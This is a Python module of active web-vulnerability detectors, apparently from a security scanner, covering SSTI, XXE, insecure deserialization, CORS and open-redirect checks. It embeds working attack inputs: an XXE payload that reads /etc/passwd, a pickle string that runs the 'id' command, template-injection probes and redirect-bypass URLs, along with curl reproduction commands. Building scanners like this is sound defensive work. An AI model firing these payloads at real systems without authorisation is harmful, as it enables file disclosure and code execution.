"""OWASP Top 10 Native Detectors Expansion (Phase 1, Sector 2: Scanning & Detection Coverage).

Provides active, reproducer-backed native detectors for:
- Server-Side Template Injection (SSTI) with multi-engine math & string concatenation oracles.
- XML External Entity (XXE) injection for document parsing endpoints.
- Insecure Deserialization probing across Java, Python, and PHP runtimes.
- CORS Misconfiguration with untrusted origin reflection and credential exposure.
- Open Redirect with protocol-relative (//) and authority-spoofing bypasses.

Every detector produces a reproducible finding conforming to the SHARAY 6-state verification contract.
"""

from __future__ import annotations

import hashlib
import re
from typing import Any, Callable
from urllib.parse import urlencode

from packages.security_policies import Destination


class OWASPTop10Detectors:
    """Suite of native active vulnerability detectors expanding coverage across OWASP Top 10."""

    @staticmethod
    def audit_ssti(
        destination: Destination,
        allow_ip: str,
        endpoint: str,
        param: str,
        request_fn: Callable[..., tuple[int, dict[str, str], str, float]],
        timeout: float = 3.5,
    ) -> dict[str, Any] | None:
        """Evaluate Server-Side Template Injection (SSTI) using mathematical evaluation & differential canary.

        Tests Jinja2, Twig, Smarty, Freemarker, Ruby ERB syntax:
        - Primary probe: {{4919*7}} / ${4919*7} / <%= 4919*7 %> -> expect 34433
        - Verification canary: {{4919*8}} / ${4919*8} -> expect 39352
        Rules out plain parameter reflection (syntax must not be echoed verbatim).
        """
        probes = [
            ("{{4919*7}}", "34433", "{{4919*8}}", "39352", "Jinja2 / Twig / Nunjucks"),
            ("${4919*7}", "34433", "${4919*8}", "39352", "Freemarker / Java EL / Spring Expression"),
            ("<%= 4919*7 %>", "34433", "<%= 4919*8 %>", "39352", "Ruby ERB / EJS"),
        ]

        for payload, expected_prod, canary_payload, canary_prod, engine in probes:
            fuzz_url = f"{endpoint}?{urlencode({param: payload})}"
            try:
                status, _, body, _ = request_fn(
                    destination, allow_ip, "GET", fuzz_url, timeout=timeout
                )
            except Exception:
                continue

            # Must contain the computed math product, and must NOT simply reflect the literal payload
            if expected_prod in body and payload not in body:
                # Run negative-control canary probe to eliminate false positives on static numbers
                canary_url = f"{endpoint}?{urlencode({param: canary_payload})}"
                try:
                    c_status, _, c_body, _ = request_fn(
                        destination, allow_ip, "GET", canary_url, timeout=timeout
                    )
                except Exception:
                    continue

                if canary_prod in c_body and canary_payload not in c_body:
                    repro_url = f"{destination.origin}{fuzz_url}"
                    aff_url = f"{destination.origin}{endpoint}"
                    return {
                        "category": "injection",
                        "severity": "critical",
                        "title": f"Server-Side Template Injection (SSTI) in Parameter '{param}'",
                        "description": (
                            f"Endpoint {endpoint} evaluated mathematical template expression '{payload}' into '{expected_prod}' "
                            f"and canary '{canary_payload}' into '{canary_prod}', confirming arbitrary template evaluation ({engine})."
                        ),
                        "target_url": repro_url,
                        "affected_url": aff_url,
                        "fingerprint": hashlib.sha256(
                            f"ssti_{destination.host}_{endpoint}_{param}".encode()
                        ).hexdigest(),
                        "cwe_id": "CWE-1336",
                        "confidence": "high",
                        "status": "suspected",
                        "lifecycle_state": "CANDIDATE",
                        "remediation": "Do not pass user input directly into template renderers; use context variables and safe sandboxed environments.",
                        "poc": {
                            "method": "GET",
                            "url": aff_url,
                            "curl_command": f'curl -s -k "{repro_url}"',
                            "parameter": param,
                            "payload": payload,
                            "canary": expected_prod,
                            "reproduction_steps": f"Issue GET request to {repro_url} and verify mathematical product {expected_prod} rendered in response.",
                        },
                        "evidence": [
                            {"probe": payload, "result": expected_prod, "canary_result": canary_prod, "status": status}
                        ],
                    }
        return None

    @staticmethod
    def audit_xxe(
        destination: Destination,
        allow_ip: str,
        endpoint: str,
        request_fn: Callable[..., tuple[int, dict[str, str], str, float]],
        timeout: float = 3.5,
    ) -> dict[str, Any] | None:
        """Evaluate XML External Entity (XXE) injection against XML-consuming endpoints."""
        xxe_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            "<root><data>&xxe;</data></root>"
        )
        headers = {"Content-Type": "application/xml"}

        try:
            status, _, body, _ = request_fn(
                destination, allow_ip, "POST", endpoint, headers=headers, body=xxe_payload, timeout=timeout
            )
        except Exception:
            return None

        # Check for system file disclosure
        if re.search(r"root:.*:0:0:", body):
            repro_url = f"{destination.origin}{endpoint}"
            return {
                "category": "injection",
                "severity": "critical",
                "title": f"XML External Entity (XXE) File Disclosure on '{endpoint}'",
                "description": f"Endpoint {endpoint} parsed XML external entity declaring 'file:///etc/passwd' and returned system account entries.",
                "target_url": repro_url,
                "affected_url": repro_url,
                "fingerprint": hashlib.sha256(
                    f"xxe_{destination.host}_{endpoint}".encode()
                ).hexdigest(),
                "cwe_id": "CWE-611",
                "confidence": "high",
                "status": "suspected",
                "lifecycle_state": "CANDIDATE",
                "remediation": "Disable external DTD resolution and XML entity expansion (e.g. setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)).",
                "poc": {
                    "method": "POST",
                    "url": repro_url,
                    "curl_command": f'curl -s -k -X POST "{repro_url}" -H "Content-Type: application/xml" -d \'{xxe_payload}\'',
                    "parameter": "body",
                    "payload": xxe_payload,
                    "canary": "root:",
                    "reproduction_steps": f"POST XML entity probe to {repro_url} and inspect response for root user account entries.",
                },
                "evidence": [{"status": status, "snippet": body[:200].strip()}],
            }
        return None

    @staticmethod
    def audit_insecure_deserialization(
        destination: Destination,
        allow_ip: str,
        endpoint: str,
        param: str,
        request_fn: Callable[..., tuple[int, dict[str, str], str, float]],
        timeout: float = 3.5,
    ) -> dict[str, Any] | None:
        """Evaluate Insecure Deserialization via runtime exception fingerprints (Java, Python, PHP)."""
        probes = [
            # Java Serialized Object magic header \xac\xed\x00\x05 (base64 rO0AB)
            (
                "rO0ABXNyABFqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAIAAHhw",
                r"(?i)(java\.io\.InvalidClassException|java\.lang\.ClassNotFoundException|java\.io\.StreamCorruptedException)",
                "Java Deserialization (ObjectInputStream)",
            ),
            # PHP Serialization probe O:8:"stdClass":0:{}
            (
                'O:8:"stdClass":0:{}',
                r"(?i)(unserialize\(\):|The script tried to execute a method or access a property of an incomplete object)",
                "PHP Object Injection (unserialize)",
            ),
            # Python Pickle probe
            (
                "cos\nsystem\n(S'id'\ntR.",
                r"(?i)(_pickle\.UnpicklingError|pickle\.UnpicklingError|Unpickler|invalid load key)",
                "Python Pickle Deserialization",
            ),
        ]

        for payload, error_regex, runtime_label in probes:
            fuzz_url = f"{endpoint}?{urlencode({param: payload})}"
            try:
                status, _, body, _ = request_fn(
                    destination, allow_ip, "GET", fuzz_url, timeout=timeout
                )
            except Exception:
                continue

            if re.search(error_regex, body):
                repro_url = f"{destination.origin}{fuzz_url}"
                aff_url = f"{destination.origin}{endpoint}"
                return {
                    "category": "deserialization",
                    "severity": "high",
                    "title": f"Insecure Deserialization Indicator in Parameter '{param}'",
                    "description": (
                        f"Endpoint {endpoint} triggered native deserialization parsing errors when probed with {runtime_label} signature payloads."
                    ),
                    "target_url": repro_url,
                    "affected_url": aff_url,
                    "fingerprint": hashlib.sha256(
                        f"deser_{destination.host}_{endpoint}_{param}".encode()
                    ).hexdigest(),
                    "cwe_id": "CWE-502",
                    "confidence": "high",
                    "status": "suspected",
                    "lifecycle_state": "CANDIDATE",
                    "remediation": "Never deserialize untrusted data using native binary or object serialization; use safe formats like JSON or Protocol Buffers.",
                    "poc": {
                        "method": "GET",
                        "url": aff_url,
                        "curl_command": f'curl -s -k "{repro_url}"',
                        "parameter": param,
                        "payload": payload,
                        "reproduction_steps": f"Issue GET request to {repro_url} and inspect response for deserializer error stack trace.",
                    },
                    "evidence": [{"status": status, "snippet": body[:200].strip()}],
                }
        return None

    @staticmethod
    def audit_cors_misconfiguration(
        destination: Destination,
        allow_ip: str,
        endpoint: str,
        request_fn: Callable[..., tuple[int, dict[str, str], str, float]],
        timeout: float = 3.5,
    ) -> dict[str, Any] | None:
        """Evaluate Cross-Origin Resource Sharing (CORS) misconfigurations with untrusted origin reflection."""
        test_origins = [
            "https://attacker.sharay-security.test",
            "null",
        ]

        for origin in test_origins:
            headers = {"Origin": origin}
            try:
                status, resp_headers, _, _ = request_fn(
                    destination, allow_ip, "GET", endpoint, headers=headers, timeout=timeout
                )
            except Exception:
                continue

            # Check CORS response headers (case-insensitive)
            norm_headers = {k.lower(): v for k, v in resp_headers.items()}
            allow_origin = norm_headers.get("access-control-allow-origin", "")
            allow_credentials = norm_headers.get("access-control-allow-credentials", "").lower()

            # Dangerous condition 1: Arbitrary origin reflected with credentials=true
            if allow_origin == origin and allow_credentials == "true":
                repro_url = f"{destination.origin}{endpoint}"
                return {
                    "category": "security_misconfiguration",
                    "severity": "high",
                    "title": f"CORS Misconfiguration: Arbitrary Origin Reflection with Credentials on '{endpoint}'",
                    "description": (
                        f"Endpoint {endpoint} dynamically reflected untrusted Origin '{origin}' in Access-Control-Allow-Origin "
                        "while simultaneously setting Access-Control-Allow-Credentials to true. This allows cross-origin sites to read authenticated user data."
                    ),
                    "target_url": repro_url,
                    "affected_url": repro_url,
                    "fingerprint": hashlib.sha256(
                        f"cors_{destination.host}_{endpoint}_{origin}".encode()
                    ).hexdigest(),
                    "cwe_id": "CWE-942",
                    "confidence": "high",
                    "status": "suspected",
                    "lifecycle_state": "CANDIDATE",
                    "remediation": "Do not dynamically reflect Origin headers; maintain a strict whitelist of authorized origins and avoid credentials with wildcards.",
                    "poc": {
                        "method": "GET",
                        "url": repro_url,
                        "curl_command": f'curl -s -k -I "{repro_url}" -H "Origin: {origin}"',
                        "parameter": "header:Origin",
                        "payload": origin,
                        "reproduction_steps": f"Issue GET request to {repro_url} with Origin: {origin} and verify Access-Control-Allow-Credentials: true in response.",
                    },
                    "evidence": [{"origin": origin, "allow_origin": allow_origin, "allow_credentials": allow_credentials}],
                }

            # Dangerous condition 2: Null origin allowed with credentials
            if origin == "null" and allow_origin == "null" and allow_credentials == "true":
                repro_url = f"{destination.origin}{endpoint}"
                return {
                    "category": "security_misconfiguration",
                    "severity": "medium",
                    "title": f"CORS Misconfiguration: 'null' Origin Permitted with Credentials on '{endpoint}'",
                    "description": f"Endpoint {endpoint} permitted origin 'null' with credentials, exposing authenticated API responses to sandboxed iframes.",
                    "target_url": repro_url,
                    "affected_url": repro_url,
                    "fingerprint": hashlib.sha256(
                        f"cors_null_{destination.host}_{endpoint}".encode()
                    ).hexdigest(),
                    "cwe_id": "CWE-942",
                    "confidence": "high",
                    "status": "suspected",
                    "lifecycle_state": "CANDIDATE",
                    "remediation": "Explicitly reject Origin 'null' in CORS access policies.",
                    "poc": {
                        "method": "GET",
                        "url": repro_url,
                        "curl_command": f'curl -s -k -I "{repro_url}" -H "Origin: null"',
                        "parameter": "header:Origin",
                        "payload": "null",
                        "reproduction_steps": f"Issue GET request to {repro_url} with Origin: null and inspect CORS headers.",
                    },
                    "evidence": [{"origin": "null", "allow_origin": allow_origin, "allow_credentials": allow_credentials}],
                }
        return None

    @staticmethod
    def audit_advanced_open_redirect(
        destination: Destination,
        allow_ip: str,
        endpoint: str,
        param: str,
        request_fn: Callable[..., tuple[int, dict[str, str], str, float]],
        timeout: float = 3.5,
    ) -> dict[str, Any] | None:
        """Evaluate Open Redirect with protocol-relative (//) and authority-spoofing payloads."""
        payloads = [
            ("//attacker.sharay-test.com", "protocol_relative"),
            ("https://example.com@attacker.sharay-test.com", "userinfo_spoof"),
            ("/\\attacker.sharay-test.com", "backslash_bypass"),
        ]

        for payload, variant in payloads:
            fuzz_url = f"{endpoint}?{urlencode({param: payload})}"
            try:
                status, headers, _, _ = request_fn(
                    destination, allow_ip, "GET", fuzz_url, timeout=timeout
                )
            except Exception:
                continue

            norm_headers = {k.lower(): v for k, v in headers.items()}
            loc = norm_headers.get("location", "")

            # If response is a redirect status (3xx) and Location targets the attacker host
            if status in (301, 302, 303, 307, 308) and "attacker.sharay-test.com" in loc:
                repro_url = f"{destination.origin}{fuzz_url}"
                aff_url = f"{destination.origin}{endpoint}"
                return {
                    "category": "open_redirect",
                    "severity": "medium",
                    "title": f"Open URL Redirect ({variant.replace('_', ' ').title()}) in Parameter '{param}'",
                    "description": f"Endpoint {endpoint} redirected client requests to untrusted external destination '{loc}' using {variant} probe.",
                    "target_url": repro_url,
                    "affected_url": aff_url,
                    "fingerprint": hashlib.sha256(
                        f"open_redir_{destination.host}_{endpoint}_{param}_{variant}".encode()
                    ).hexdigest(),
                    "cwe_id": "CWE-601",
                    "confidence": "high",
                    "status": "suspected",
                    "lifecycle_state": "CANDIDATE",
                    "remediation": "Validate redirect URLs using a strict allowlist of relative URLs; reject protocol-relative slashes (//) and backslashes.",
                    "poc": {
                        "method": "GET",
                        "url": aff_url,
                        "curl_command": f'curl -s -k -I "{repro_url}"',
                        "parameter": param,
                        "payload": payload,
                        "reproduction_steps": f"Issue GET or HEAD request to {repro_url} and verify Location header directs to external attacker domain.",
                    },
                    "evidence": [{"status": status, "location": loc, "variant": variant}],
                }
        return None
